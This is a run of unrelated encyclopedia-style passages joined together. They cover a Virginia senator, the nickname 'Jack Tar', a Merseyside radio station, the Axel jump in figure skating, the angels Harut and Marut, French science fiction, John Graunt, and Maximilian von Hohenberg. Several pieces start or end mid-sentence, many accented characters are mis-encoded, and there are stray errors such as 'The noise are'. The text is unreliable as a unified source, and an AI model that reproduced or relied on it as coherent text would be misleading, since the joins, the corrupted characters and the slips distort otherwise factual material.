a candidate for renomination in 1886, months after the death of his wife (and the year after his brother James was elected to Virginia's House of Delegates). In the late 1880s, Barbour joined with other Conservative Democrats and opposed the Readjuster Party, a coalition of blacks and Republicans led by Harrison H. Riddleberger and William Mahone. He helped form the first political machine of \\"Conservative Democrats\\", whose power was to last 80 years until the demise of the Byrd Organization in the late 1960s. In 1888, Barbour ran to succeed Sen. Riddleberger when he declined to seek re-election (and died the following year). Elected as a Democrat to the United States Senate Barbour served from March 4, 1889, but died in office in Washington, D.C. on May 14, 1892. Hunton was appointed to serve until the election for the remainder of the term, which he won but declined to seek a full term. Death and legacy John Barbour was interred in the burial ground at \\"Poplar Hill,\\" Prince George's County, Maryland beside his wife Susan. His brother James' son, John S. Barbour, briefly became a newspaper editor, and later lawyer and mayor of Culpeper, although he moved to Fairfax County, Virginia.

By World War I the term was used as a nickname for those in the U.S. Navy. Members of the public and seafarers alike made use of the name in identifying those who went to sea. It was not used as a pejorative and sailors were happy to use the term to label themselves. Etymology Recruitment poster from the Napoleonic Wars There is some dispute among historians about the origin of \\"Jack\\", but it was a frequently used generic that identified the mass of common people. There are several plausible etymologies for the reference to \\"tar\\": * In the age of wooden sailing vessels, a ship's rigging was rope made of hemp, which would rot quickly in such a damp environment. To avoid this, the ropes and cables of the standing rig were soaked in tar, which had to be replenished by tarring. * Seamen were known to 'tar' their clothes before departing on voyages, in order to make them waterproof, before the invention of waterproof fabrics. Later they frequently wore coats and hats made from a waterproof fabric called tarpaulin. This may have been shortened to 'tar' at some point. * It was common among seamen to plait their long hair into a ponytail and smear it with high grade tar to prevent it getting caught in the ship's equipment. Usages Gilbert and Sullivan's operetta, H.M.S. Pinafore, subtitled The Lass That Loved a Sailor, uses the synonym 'tar' frequently in its dialogue, including the songs 'The Merry Maiden and the Tar' and 'A British Tar.' * One of John Philip Sousa's lesser known works was his 'Jack Tar March,' written in 1903, which featured \\"The Sailor's Hornpipe\\" tune in one of its segments. * Jack Tar: Life in Nelson‚Äôs Navy, best-selling non-fiction book written by Roy and Lesley Adkins about the real lives of sailors in Nelson's age. * The traditional English folk song \\"Go to Sea Once More\\" (alternately titled \\"Jack Tarr the Sailor\\") tells the tale of a sailor by the name of Jack Tarr who loses everything after an ill-advised drunken escapade while ashore in Liverpool. * The traditional English folk song \\"Jacky Tar,\\" sung by Eliza Carthy (previously collected and sung by A. L. Lloyd as \\"Do Me Ama\\"): Roud 511; Laws K40; Ballad Index LK40. * John Adams called the crowd involved with the Boston Massacre \\"a motley rabble of saucy boys, negros and molattoes, Irish teagues and outlandish jack tarrs.\\" *\\"Heart of Oak,\\" the official march of the Royal Navy, features the line \\"Heart of oak are our ships, jolly tars are our men.\\" *Rollins College of Winter Park, Florida chose the \\"Tar\\" as its mascot. *People born in Swansea, UK are known as \\"Jacks\\" or \\"Swansea Jacks.\\" One explanation for the name is that the people of Swansea had a reputation as skilled sailors and that their services were much sought after by the navy. * In Anthony Shaffer's comedy/thriller play Sleuth, the most prominent of Andrew Wyke's automata is Jolly Jack Tarr, the Jovial Sailor. This life-sized figure laughs, and his body shakes appropriately, with the pressing of a remote control button. He is in several scenes, including one where a clue to a murder is hidden on Jolly Jack Tarr's person. * The term forms the basis for the expression, \\"I'm alright, Jack,\\" which signifies smug complacence at the expense of others. * Period writers often referred to the simplicity of Jack Tar, and when he was represented as a drunk and a womanizer, the moral of the story was that he was easy prey for women, publicans and boarding house keepers.

It was sold to The Local Radio Company (TLRC) who embarked upon a rebranding and relaunch. In 2006, it was sold back to Ray Ferguson who reverted to the name KCR, and having to sell the station again, this time to Polaris Media in August 2008 but the sale was reneged two months later with KCR Media (Previous owners) using a clause to gain the company and station back after finding another person willing to back the ill-fated venture.  The Rocket  During the period between the takeover and the relaunch, many of the original volunteer presenters and some minority specialist music shows were taken off the air, and replaced with paid professionals. The Rocket broadcast TLRC's Musicfunlife format. The name 'Rocket' refers to Stephenson's Rocket, a locomotive which was the first passenger locomotive in the world, after winning the 'Rainhill Trials'. The Station's news output was better during TLRC's ownership of the station however TLRC Group ran into financial difficulties, and sold the station to a group of local businessmen, who included some of the original investors,  Return to KCR  In 2007 the name 'The Rocket' was dropped and the station was once again re-branded 106.7 KCR FM . The station was then forced to relocate from its original base in the Cables Retail Park in Prescot, due to redevelopment, to new studios situated on Paramount Studios, Paramount Business Park just off Wilson Road in Huyton. KCR FM was purchased on 19 August orchestrated handover from the previous owners KCR Media who took the station to near bankruptcy.  KCR FM Problems  On 24 October 2008, KCR FM were locked out of the building by bailiffs acting on behalf of landlords \\"Brookhouse\\", after attempts to retrieve unpaid rent. All equipment and assets of the company were seized that morning, and the station was put onto automation. KCR FM have yet to comment on the situation and future of the station. A notice was placed upon the front door of the studio reading \\"Landlords have taken peaceful possession of the property and the locks have been changed as a result of persistent breaches of the former lease. Access can only be allowed with the consent of the landlords\\". On 28 October, KCR FM was handed a yellow card by UK regulator Ofcom, for not fulfilling its format. The regulator was quoted as saying \\"It is clear the station is at present broadcasting no local content, information or news as required by its Format.\\"  Mersey 106.7  KCR's transmitter on 106.7 was turned off around lunchtime on Thursday, 27 November 2008.

The Axel has an extra half rotation, which, as figure skating expert Hannah Robbins states, makes a triple Axel \\"more a quadruple jump than a triple\\". History Norwegian figure skater Axel Paulsen, creator of the Axel jump The Axel jump, also called the Axel Paulsen jump for its creator, Norwegian figure skater Axel Paulsen, is an edge jump in the sport of figure skating.Hines (2015), p. 49 Figure skating historian James Hines calls the Axel \\"figure skating's most difficult jump\\".Hines (2011), p. xxxii It is the only competition jump that begins with a forward takeoff, which makes it the easiest jump to identify. Skaters will often perform a double or triple Axel, followed by a simpler jump, during combination jumps. In competitions, the base value of a single Axel is 1.10; the base value of a double Axel is 3.30; the base value of a triple Axel is 8.00; and the base value of a quadruple Axel is 12.50. A double or triple Axel is required in both the short programs and free skating programs for junior and senior single skaters in all International Skating Union (ISU) competitions. The Axel jump is the most studied jump in figure skating. =Firsts= The first skater to accomplish an Axel was its creator, Axel Paulsen, in 1882 at the first international figure skating competition, which was held in Vienna. Hines, who called Paulsen \\"progressive\\" for inventing it, stated that he \\"did as a special figure\\".Hines (2011), p. 132 By the mid-1920s, the Axel was the only jump that was not being doubled. Professional German skater Charlotte Oelschl√§gel, during the early 1900s, was the first woman to include an Axel in her programs; Hines reported that she would terminate the Axel with her \\"famous fade-away ending\\",Hines (2015), p. 185 the Charlotte spiral, a move she invented.Hines (2011), p. 170 In the early 1920s, Sonja Henie from Norway was the first female skater to perform an Axel in competition. Hines also reports that in the 1930s, Austrian skater Felix Kaspar, who was known for his athleticism, performed Axels that were four feet high and 20 feet from takeoff to landing; Hines stated that \\"there is little doubt in the minds of those who saw him that had the technique then been known, he probably could have easily performed triple or even quadruple jumps\\".Hines (2015), p. 113 American Dick Button was the first skater to complete a double Axel in competition, at the 1948 Winter Olympic Games. American Carol Heiss was the first woman to perform a double Axel, in 1953. The first triple Axel in competition was performed by Canadian Vern Taylor at the 1978 World Championships. The first male skater to complete a triple Axel during the Olympics was Canadian skater Brian Orser in 1984. The first throw triple Axel was performed by American pair skaters Rena Inoue and John Baldwin, at the 2006 U.S. National Championships.Media Guide, p. 15 As of 2020, the quadruple Axel has not been successfully completed in competition.Media Guide, p. 14 According to The New York Times, the triple Axel \\"has become more common for male skaters\\" to perform. The first female skater to complete a triple Axel was Japanese skater Midori Ito, at the 1989 World Championships.Media Guide, p. 13 Only three women have completed the triple Axel during the Olympics: Ito in 1992, Japanese skater Mao Asada in 2010 and 2014, and American skater Mirai Nagasu in 2018. Tonya Harding was the first American female skater to complete the triple Axel in competition, at the 1991 U.S. Championships; it was another 10 years before another female skater attempted it. As of 2019, 11 women have successfully completed the triple Axel in competition. Execution American figure skater Mirai Nagasu, in 2010 The Axel is an edge jump, which means that the skater must spring into the air from bent knees. It is the oldest but most difficult figure skating jump. A \\"lead-up\\" to the Axel is the waltz jump, a half-revolution jump and the first jump that skaters learn. The Axel has three phases: the entrance phase (which ends with the takeoff), the flight phase, when the skater rotates into the air, and the landing phase, which begins when the skater's blade hits the ice and ends when they are \\"safely skating backwards on the full outside edge with one leg behind in the air\\".Mazurkiewicz et al., p. 3 According to researcher Anna Mazurkiewicz and her colleagues, the most important parts of the entrance phase is the transition phase (also called the pre-takeoff phase) and the takeoff itself.Mazurkiewicz et al., p. 5 The jump has a forward takeoff, approached with a series of backward crossovers in either the opposite or the same direction to the jump's rotation, followed by a step forward onto the forward outside takeoff edge. The skater must also approach the jump typically from the left forward outside edge of the skate, enabling them to step forward. The skater then kicks through with their free leg, helping them to jump into the air. The skater must land on the right back outside edge of the skate. The change in foot required to complete the Axel means that the skater's centre of gravity must be transferred from the left side to the right, while rotating in the air, to reach the correct position to land. As a result, the Axel has an extra half-rotation, which, as figure skating expert Hannah Robbins states, \\"makes a triple Axel more a quadruple jump than a triple\\": the single Axel consists of one-and-a-half revolutions, the double Axel consists of two-and-half revolutions, and the triple Axel consists of three-and-a-half revolutions. Sports reporter Nora Princiotti states, about the triple Axel, \\"It takes incredible strength and body control for a skater to get enough height and to get into the jump fast enough to complete all the rotations before landing with a strong enough base to absorb the force generated\\". According to American skater Mirai Nagusu, \\"falling on the triple Axel is really brutal\\". It has been shown that the more skilled skaters have greater takeoff velocities and jump lengths. When skaters perform double Axels, they exhibit greater rotations during the flight phase, take off in more closed positions, and attain greater rotational velocities than when performing single Axels. They also increase their turns not by increasing the time in the air, but by increasing their rotational velocity when performing single, double, and triple Axels. According to researcher D.L. King, the key to executing a successful triple Axel is \\"achieving a high rotational velocity by generating angular momentum at take-off and minimising the moment of inertia about the spin axis\\".Mazurkiewicz et al., p. 4 References Works cited Hines, James R.

According to some narratives, those two angels were in the time of Idris. The Quran indicates that they were a trial for the people and through them the people were tested with sorcery. The noise are probably etymologically related to Haurvatat and Ameretat, two Zoroastrian archangels.  Quranic narrative  In the Quran, the two angels are briefly mentioned as follows:  Interpretations by scholars  = Tabari = Tabari offers different narrations linking back to the sahaba. Although differing in detail, the story can be summarized as follows: > The angels were astonished at the acts of disobedience committed by the > human beings on earth, claiming they would do better than them. Therefore, > God challenged the angels to choose two representatives among them, who > would descend to earth and be endowed with bodily desires. During their stay > on earth, they fell in love with a woman named Zohra (often identified with > Venus). She told them she would become intimate with them if they joined her > in idolatry and tell her how to ascend to heaven. The angels refused and > remained pious. Later they met her again and the woman this time stated she > would become intimate with them if they drank alcohol. The angels thought > that alcohol could not cause great harm and therefore, they accepted the > condition. After they were drunk, they became intimate with her and after > noticing a witness, they killed them. On the next day, Harut and Marut > regretted their deeds but could not ascend to heaven anymore due to their > sins, as their link to the angels was broken. Thereupon, God asked them, > either their punishment shall be in this world or in the hereafter. They > chose to be punished on earth and therefore were sent to Babel as a test, > teaching humans magic but not without warning them that they were just a > temptation. = Ibn Kathir = The 14th-century scholar Ibn Kathir gives an alternative version of Harut and Marut. Although regarding their story as sound in chain of narrations, but since it goes back to Ibn Abbas and not to Muhammad himself, he asserts Muslims should not follow this narrative. Instead he goes into depth about what exactly the angels had taught to the people in his book, Stories of the Qur'an: > Narrated Al-\`Ufi in his interpretation on the authority of Ibn \`Abbas (May > Allah be pleased with him) pertaining to Allah's Statement {They followed > what the Shayatin (devils) gave out (falsely of the magic) in the lifetime > of Sulaiman (Solomon). Sulaiman did not disbelieve, but the Shayatin > (devils) disbelieved, teaching men magic and such things that came down at > Babylon to the two angels, Harut and Marut but neither of these two (angels) > taught anyone (such things) till they had said, \\"We are only for trial, so > disbelieve not (by learning this magic from us).\\" ...} When Sulaiman lost > his kingdom, great numbers from among mankind and the jinn renegaded and > followed their lusts. But, when Allah restored to Sulaiman his kingdom and > the renegade came to follow the Straight Path once again, Sulaiman seized > their holy scriptures which he buried underneath his throne. Shortly after, > Sulaiman (Peace be upon him) died. In no time, the men and the Jinn > uncovered the buried scriptures and said: This was a book revealed by Allah > to Sulaiman who hid it from us. They took it as their religion and Allah the > Almighty revealed His Saying: {And when there came to them a Messenger from > Allah confirming what was with them, a party of those who were given the > Scripture threw away the Book of Allah behind their backs as if they did not > know!}. (Al-Baqarah, 101) and they followed what the devils gave out, i.e. > all that blocks the remembrance of Allah. = Criticism = Harut and Marut in Their Forever Well (1703) Some Islamic exegetes prefer to view Harut and Marut as ordinary men rather than angels, who learned magic from devils since their legend cannot be attributed to Muhammed with certainty. This also shall defend the impeccability of angels, as already asserted by Hasan of Basra, but mostly emphasized during the Salafi-movement. Contrary, the story was accepted by many Medieval Muslims, and also cited by influential scholars such as Ahmad ibn Hanbal. According to Muslim scholar Ansar Al-'Adl, many interpretations of the verse originated from alleged Judeo-Christian sources that came to be recorded in some works of Quranic exegesis, called Tafsir. Numerous stories have been transmitted about these verses, yet all center around the same basic story. Abdullah Yusuf Ali, translator of the Qur'an into English, asserts that the source of this story may be the Jewish Midrash: > Among the Jewish traditions in the Midrash was a story of two angels who > asked Allah's permission to come down to earth but succumbed to temptation, > and were hung up by their feet at Babylon for punishment. Such stories about > sinning angels who were cast down to punishment were believed in by the > early Christians, also (see II Peter 2:4, and Epistle of Jude, verse 6). However, most recent research in the field of Islamic Studies has established that the earliest possible date for the Midrash dealing with the Harut & Marut narrative, dates from the 11th century and thus postdates the advent of Islam by more than 400 years: > Careful comparison of the developed narratives of the \\"Tale of Harut and > Marut\\" and the Midrash amid the larger literary corpora within which they > are embedded suggests that the Muslim Harut wa-Marut complex both > chronologically and literarily precedes the articulated versions of the > Jewish Midrash. What is likely the oldest Hebrew form of the story dates > from approximately the eleventh century, several hundred years after the > bulk of the Muslim evidence. Similarly, Patricia Crone argues, that the Midrash actually adapted the story from Muslims,Patricia Crone THE BOOK OF WATCHERS IN THE QUR√ÖN page 10-11 but the names were changed to Azazel and Samyaza, terms for fallen angels in other earlier Jewish scriptures, however, regarded as unauthentic by Rabbinic Judaism. = Shia discussion = Harut and Marut in Arabic calligraphy Hasan ibn Ali ibn Muhammad, the 11th Imam of the Twelver Shi'ah, after being asked about the truth of the story, refuted the belief that angels may emerge as transgressors, because, he reasoned, they lack freedom to act upon their will and just rely on the Will of God. Pertaining to the Quran's statement: \\"To Him belongs whatever is in the heavens and the earth, and those who are near Him do not disdain to worship Him, nor do they become weary. They glorify [Him] night and day, and they do not flag,\\" he argued that if Harut and Marut had committed oppression and injustice, how could they have been God's representative or messenger on earth? Shia Islamic scholars and philosophers such as Sadr al-Din al-Shirazi believe that angels are regarded as mujarradat who are \\"intrinsically intelligible\\" and free from the limitations of material existence. A mujarrad being, as described by Shirazi, is not necessarily something \\"that exists as an abstraction in the mind\\". It can be a concrete reality as in the case of God, the angels or the intellect.

It remains an active and productive genre which has evolved in conjunction with anglophone science fiction and other French and international literature. History =Proto science fiction before Jules Verne= As far back as the 17th century, space exploration and aliens can be found in Cyrano de Bergerac's Comical History of the States and Empires of the Moon (1657) and Bernard Le Bovier de Fontenelle's Entretien sur la Pluralit√© des Mondes (1686). Voltaire's 1752 short stories Microm√©gas and Plato's Dream are particularly prophetic of the future of science fiction. Also worthy of note are Simon Tyssot de Patot's Voyages et Aventures de Jacques Mass√© (1710), which features a Lost World, La Vie, Les Aventures et Le Voyage de Groenland du R√©v√©rend P√®re Cordelier Pierre de M√©sange (1720), which features a Hollow Earth, Louis-S√©bastien Mercier's L'An 2440 (1771), which depicts a future France, and Nicolas-Edm√© Restif de la Bretonne's La D√©couverte Australe par un Homme Volant (1781) notorious for his prophetic inventions. Other notable proto-science fiction authors and works of the 18th and 19th century include: * Jean-Baptiste Cousin de Grainville's Le Dernier Homme (1805) about the Last Man on Earth. * Historian F√©lix Bodin's Le Roman de l'Avenir (1834) and Emile Souvestre's Le Monde Tel Qu'il Sera (1846), two novels which try to predict what the next century will be like. * Louis Geoffroy's Napoleon et la Conqu√™te du Monde (1836), an alternate history of a world conquered by Napoleon. * C.I. Defontenay's Star ou Psi de Cassiop√©e (1854), an Olaf Stapledon-like chronicle of an alien world and civilization. * Astronomer Camille Flammarion's La Pluralit√© des Mondes Habit√©s (1862) which speculated on extraterrestrial life. *Henri de Parville's An Inhabitant of the Planet Mars. Originally a hoax in the French newspaper Le Pays in 1864, about a Colorado oil prospector which find a meteorite with a mummy inside that is believed to come from Mars, it was picked up by Jules Verne's publisher who released it in an expanded book version in 1865. *Achille Eyraud's Voyage to Venus (1865), a story about humans who travel to Venus in an interplanetary rocket-powered spaceship, where they meet an utopian society. However, modern French science fiction, and arguably science fiction as a whole, begins with Jules Verne (1828‚Äì1905), the author of many of the classics of science fiction. =After Jules Verne= The first few decades of French science fiction produced several renowned names of literature. Not only Jules Verne, but also: *Louis Boussenard, a successor of Verne. *Didier de Chousy, who wrote Ignis (1883), a novel where an inventor tries to tap the energy from the centre of the earth in a dystopian society dominated by technology. *Charles Derennes (1882‚Äì1930), who wrote novels like Le peuple du pole (1907) (The People of the Pole), where explorers finds a secret alien society of technologically-advanced reptilian humanoids who have evolved in isolation from the rest of the world for millions of years. *Arnould Galopin, creator of Doctor Omega (1906). *Jean de La Hire, creator of Nyctalope *Paul d'Ivoi, author of the Vernian Voyages Excentriques and creator of Pulp heroes Lavar√®de and Docteur Myst√®re (1900). *Andr√© Laurie, another successor of Verne. *John Antoine Nau, who won the first Prix Goncourt in 1903 for his science fiction novel Enemy Force. *Georges Le Faure & Henri de Graffigny, who sent their heroes explore the Solar System in Les Aventures Extraordinaires d'un Savant Russe (1888) *Gustave Le Rouge, author of Le Prisonnier de la Plan√®te Mars (1908) and Le Myst√©rieux Docteur Corn√©lius (1913). *Albert Robida, a writer and an artist, arguably the \\"father\\" of science fiction illustration. * Maurice Renard, a Wellsian writer, author of Le Docteur Lerne (1908), Le P√©ril Bleu (1910) and Les Mains d'Orlac (\\"The Hands of Orlac\\", 1920) *J.-H. Rosny a√Æn√©, born in Belgium, the father of \\"modern\\" French science fiction, a writer also comparable to H. G. Wells, who wrote the classic Les Xipehuz (1887) and La Mort de la Terre (1910). *Auguste Villiers de l'Isle-Adam, author of L'√àve future (1886) After H. G. Wells' The Time Machine was translated into French by Henry D. Davray in 1895 as the first of his works, soon followed by other translations of his stories,The Reception of H.G. Wells in Europe influencing French science fiction writers such as Maurice Renard. World War I brought an end to this early period. Where the rapid development of science and technology during the late 19th century motivated the optimistic works of these early science fiction authors, the horrors of industrialised warfare and specifically the application of advanced technologies in such a destructive manner made many French authors more pessimistic about the potential of technological development. Between the two world wars, Rosny a√Æn√© published his masterpiece Les Navigateurs de l'Infini (1924), in which he invented the word \\"astronautique\\". There were a few notable new authors during the period: *R√©gis Messac, for Quinzinzinzili (1935). *Jos√© Moselli, for La fin d'Illa (1925). *Jacques Spitz, for La guerre des mouches (1938). *Ren√© Th√©venin for Chasseurs d'Hommes (1930) and Sur l'Autre Face du Monde (1935), the latter under a pseudonym. =After World War II= Until the late 1950s, relatively little French science fiction was published, and what was published was often very pessimistic about the future of humanity, and frequently was not advertised as \\"science fiction\\" at all. Ren√© Barjavel's Ravage (1943) and Pierre Boulle's Planet of the Apes (1963) are widely known examples. This period of decrease of French science fiction (abbreviated SF) is known to many as a \\"golden age\\" of English-language and particularly American science fiction. When French science fiction began reappearing strongly after World War II, it was the themes and styles of Anglophone science fiction which served as an inspiration for new works. The first genre magazine, Fiction ‚Äì at first a translation of the American Magazine of Fantasy & Science Fiction ‚Äì began appearing in 1953. The major genre imprint of the 1950s and '60s publishing translations of American novels was Le Rayon Fantastique published by Hachette and Gallimard, and edited by George Gallet and Stephen Spriel. Nevertheless, Le Rayon Fantastique helped begin the careers of a number of native authors: *Francis Carsac *Philippe Curval *Daniel Drode *Michel Jeury (writing under the pseudonym of \\"Albert Higon\\") *G√©rard Klein *Nathalie Henneberg During 1951, publisher Fleuve Noir initiated Anticipation, a paperback series devoted mostly to French authors which released a steady series of pulp-like novels. Among its authors were: *Pierre Barbet *Richard Bessi√®re *B.-R. Bruss (aka Roger Blondel, pseudonyms of Ren√© Bonnefoy) *Andr√© Caroff *Jimmy Guieu *G√©rard Klein (writing under the pseudonym of \\"Gilles d'Argyre\\") *Maurice Limat *Andr√© Ruellan (writing under the pseudonym of \\"Kurt Steiner\\") *Louis Thirion *Stefan Wul *Ren√© Barjavel Later, many major names of French science fiction were printed first by that imprint. Another series, Pr√©sence du Futur, was initiated during 1954 by publisher Deno√´l. Among its authors were: *Jean-Pierre Andrevon *Jean-Louis Curtis *G√©rard Klein *Jacques Sternberg *Jacques Vallee (writing under the pseudonym of \\"J√©r√¥me S√©riel\\") During this era, there was very little mainstream critical interest for French SF. French cinema, however, proved to be more successful for science fiction. Jean-Luc Godard's 1965 film Alphaville‚Äîa thriller and satire of French politics‚Äîwas the first major example of French \\"New Wave\\" science fiction. Unlike American science fiction, space travel was not the major theme for the post-1968 French authors. A new generation of French writers, who had few memories of the horrors of the past two generations, were inspired by the transformation of France during the post-war era. Especially after May 1968, French SF authors wrote about political and social themes in their works. Authors like Michel Jeury, Jean-Pierre Andrevon and Philippe Curval began to attract acclaim for their redevelopment of a genre which, at the time, was still considered primarily a juvenile entertainment. During the 1970s, comics began to be important for French SF. M√©tal hurlant‚Äîthe French magazine that \\"spun off\\" the American magazine Heavy Metal ‚Äì began developing the possibilities of science fiction as a source for comics. Graphic novels are now a major‚Äî if not the major‚Äî outlet for French science fiction production today. During the 1980s, French authors began to consider science fiction as appropriate for experimental literature. The influence of postmodernism on literature and the development of cyberpunk themes catalysed a new body of French SF, near the end of the decade: the so-called \\"Lost Generation\\" (represented by such writers as Claude Ecken, Michel Pagel, Jean-Marc Ligny or Roland C. Wagner) At present, French SF is particularly well represented by graphic novels, and a number of titles are printed annually. As in most of the developed world, magazine culture has decreased dramatically because of the internet, but a number of French SF magazines remain in print, including Bifrost, Galaxies and Solaris. Despite the space opera revival of the beginning of the 1990s (Ayerdhal, Serge Lehman, Pierre Bordage, Laurent Genefort) the influence from English language science fiction and movies has diminished considerably since the \\"Lost Generation\\", while the influence of animation, video games and other international science fiction traditions (German, Italian) has increased. The influence of Japanese manga and anime has also been particularly noticeable during recent years for graphic formats. Other notable French science fiction authors, post-World War IIG.-J.

Graunt was one of the first demographers, and perhaps the first epidemiologist, though by profession he was a haberdasher. He was bankrupted later in life by losses suffered during Great Fire of London and the discrimination he faced following his conversion to Catholicism.https://products.abc-clio.com/ABC- CLIOCorporate/product.aspx?pc=A1861C Biography Born in London, John Graunt was the eldest of the seven or eight children of Henry and Mary Graunt. Graunt's father was a draper who had moved to London from Hampshire. In February 1641, Graunt married Mary Scott, with whom he had one son (Henry) and three daughters. He became a freeman of the Drapers' Company at age 21. Graunt worked in his father's shop until his father died in 1662, and Graunt became influential in the City. He was able to secure the post of professor of music for his friend William Petty in 1650. He served in various ward offices in Cornhill ward, becoming a common councilman about 1669‚Äì71, warden of the Drapers' Company in 1671 and a major in the trained band. Graunt, along with Sir William Petty, developed early human statistical and census methods that provided a framework for modern demography. He is credited with producing and widely distributing the first life table, giving probabilities of survival to each age. This was remarkable considering the Bills of Mortality did not include age at death, thus Graunt used his knowledge of mathematics to create such a table. Graunt is also considered as one of the first experts in epidemiology, since his famous book was concerned mostly with public health statistics. The erudition of Graunt's book, Natural and Political Observations Made Upon the Bills of Mortality, led Graunt to the Royal Society. On February 5th, 1661, Graunt presented fifty copies of his book to the Royal Society of Philosophers, and where he presented his work and was subsequently elected a fellow in 1662 with the endorsement of King Charles II. King Charles II's recommendation was notable due to Graunt's tradesman profession, as the King suggested to the Royal Society to accept \\"any more such Tradesman.\\" Graunt was chosen as a member of the council in November 1664 and represented the society at various meetings. Graunt's house was destroyed in the Great Fire of London at which point he was a manager of the New River Company, his clothing firm. Because of this, Graunt encountered many financial problems that eventually lead him to bankruptcy. One of his daughters daughter became a nun in a Belgian convent and Graunt decided to convert to Catholicism at a time when Catholics and Protestants were struggling for control of England and Europe, leading to prosecutions for recusancy. John Graunt died of jaundice and liver disease at the age of 53. John Aubrey reported that he was \\"a pleasant facetious companion and very hospitable\\" and noted that his death was \\"lamented by all good men that had the happinesse to knowe him.\\" Tribute to Graunt's pioneering work was paid by Sir Liam Donaldson in 2012 on the tenth anniversary of the Public Health Observatories. Natural and Political Observations Made Upon the Bills of Mortality Graunt's book Natural and Political Observations Made upon the Bills of Mortality (published 1662 Old Style or 1663 New Style) compiled and analyzed data from the Bills of Mortality. Graunt, using the Rule of Three (mathematics) and ratios obtained by comparing years in the Bills of Mortality, was able to make estimates about the size of the population of London and England, birth rates and mortality rates of males and females, and the rise and spread of certain diseases. =Bills of Mortality= Bill of Mortality from 1606, one of the earlier times which John Graunt looked at in his work. John Graunt's analysis in Natural and Political Observations Made Upon the Bills of Mortality consisted of a compilaiton and an analysis of data from the Bills of Mortality. The Bills of Mortality were documents offering information about the births, deaths, and causes of death in London parishes, printed and distributed weekly on Thursdays (in addition to an annual report released in December). The Bills of Mortality were said by Graunt to begin in 1592, and consistently released starting in 1603. Graunt describes how the data was collected for these Bills in his Natural and Political Observations Made Upon the Mortality of Man: :\\"When anyone dies, then either by tolling, or by ringing of a Bell, or by bespeaking of a Grave of the Sexton, the same is known to the Searchers, corresponding with the said Sexton. The Searchers hereupon...examine by what Disease, or Casualty the corps died. Hereupon they make their Report to the Parish-Clerk, and he, every Tuesday night, carries in an Accompt of all the Burials, and Christnings, hapning that Week, to the Clerk of the Hall. On Wednesday the general Accompt is made up, and Printed, and on Thursdays published and dispersed to the several Families, who will pay for four shillings per Annum for them.‚Äù Graunt's description of the method of data collection for the Bills of Mortality also serves as an example of Graunt's use of scrutiny in appraising the data he was analyzing. Graunt critiqued the collectors (\\"Searchers\\") who determined cause of death of the corpses; this critique manifested in Graunt's investigations into the effects on mortality of certain diseases, as Graunt suggested many causes of death were misrepresented. Table of Casualties in Natural and Political Observations Made Upon the Bills of Mortality (5th edition, published 1676) =Epidemiology= Graunt's work reached rudimentary conclusions about the mortality and morbidity of certain diseases. Graunt was highly skeptical of the number of deaths recorded in the Bills of Mortality as due to the plague. Graunt speculated about the reasons for these misclassifications, one of which includes the reliability of those reporting causes of death in the Bills of Mortality. Another example of Graunt's work in epidemiology is his investigation of the sudden surge in deaths in 1634 due to Rickets. Graunt looked at two other causes of death\\"Liver-grown\\" and \\"Spleen\\"in addition to \\"Rickets,\\" combining the three and comparing the frequency of deaths due to each cause between years. Graunt investigated if the sudden increase in deaths due to rickets in the Bills of Mortality was actually the result of misclassifying corpses who were said to have died from \\"Liver-grown\\" and \\"Spleen.\\" Graunt concluded that \\"Rickets\\" as a cause of death was at a maximum for the first time. =Editions of the book= Graunt's work ran to five editions. The first edition lists John Graunt as a citizen. The first edition was printed and presented by Graunt to the Royal Society of London, after which Graunt was accepted as a member. All successive editions list John Graunt as a member of the Royal Society. The final edition was printed in 1676, after Graunt's death, likely with the help of Sir William Petty. Impact John Graunt's application of theory to data was one of the first instances of descriptive statistics. Some of Graunts' tables are the only resource for population data for certain periods of time, due to lost records in the Great Fire of London. After the publication of Graunt's work, France began to collect more descriptive and consistent censuses, though it is unknown if there was a direct connection between these two events. Graunt's work is still used today to study population trends and mortality, for example, studies on suicide. Tribute to Graunt's pioneering work was paid by Sir Liam Donaldson in 2012 on the tenth anniversary of the Public Health Observatories.

Life Sarcophagus of Maximilian, with his wife's sarcophagus on the left Maximilian was born on 29 September 1902 and baptized in Vienna two days later with Archduke Charles Stephen of Austria as sponsor. From birth he had the lesser princely title and the nobiliary particle von Hohenberg accorded his mother as a predicate at the time of her marriage, and in 1905 he shared with his siblings her receipt of the style \\"Serene Highness\\". Although Sophie had been raised from Princess (F√ºrstin) to Duchess (Herzogin) in 1909 by Emperor Franz Joseph, because that title was accorded ad personam, Maximilian did not inherit it upon her death in 1914. On 31 August 1917, however, Emperor Charles I granted him the dukedom on a hereditary basis, simultaneously raising his treatment from \\"Serene Highness\\" (Durchlaucht) to \\"Highness\\" (Hoheit). In 1911, it was rumored among French circles that Germany planned to install Maximilian as Imperial Governor of Alsace-Lorraine. Following the assassination of his parents in Sarajevo in 1914, which resulted in the outbreak of World War I, Maximilian, his sister, Princess Sophie and their brother, Prince Ernst, were initially taken in by their maternal aunt and uncle Marie and Jaroslav, Prince and Princess von Thun und Hohenstein, subsequently being raised in the care of their step- grandmother, Archduchess Maria-Theresa of Austria. In 1919, following the defeat of the Austro-Hungarian Empire and collapse of the Habsburg monarchy, the new republic of Czechoslovakia expropriated Konopi≈°tƒõ Castle, Maximilian's chief residence, and other family properties in the former Kingdom of Bohemia, and expelled the brothers to Austria. Subsequently, they lived in Vienna and at Artstetten Castle in Lower Austria. Maximilian obtained a law degree from the University of Graz in 1926. He managed the family properties and worked as a lawyer. Because he had never been a dynast of the Austrian Imperial Family, he was neither banished nor his properties expropriated under Austria's law of exile of 3 April 1919. Remaining in Vienna, by the 1930s the Duke became the leader within Austria of a significant movement for restoration of the monarchy and of his kinsman Otto von Habsburg to the former Imperial throne. Registration card of Maximilian Hohenberg as a prisoner at Dachau Nazi Concentration Camp In March 1938, Austria became part of the German Reich as a result of the Anschluss. Having spoken out for the independence of Austria and against the Anschluss, Maximilian and his brother were arrested by the Reich authorities and interned in Dachau concentration camp, where they were chiefly employed in cleaning the latrines. According to Leopold Figl (who served as Chancellor of Austria after World War II), they did so cheerfully and maintained comradely relations with fellow prisoners. Maximilian was released after six months (Ernst was transferred to other concentration camps and released only in 1943) and was then compelled to stay at Artstetten Castle; the Reich authorities also expropriated the family's other properties in Austria. After the liberation of Austria in 1945, the residents of Artstetten elected Maximilian as mayor, with the concurrence of the Soviet occupation authorities. He served two five-year terms as mayor. Maximilian died on 8 January 1962 at the age of 59. He is buried in the crypt of the Hohenberg family's Artstetten Castle.Family crypt info His wife's remains are in a sarcophagus to his left.

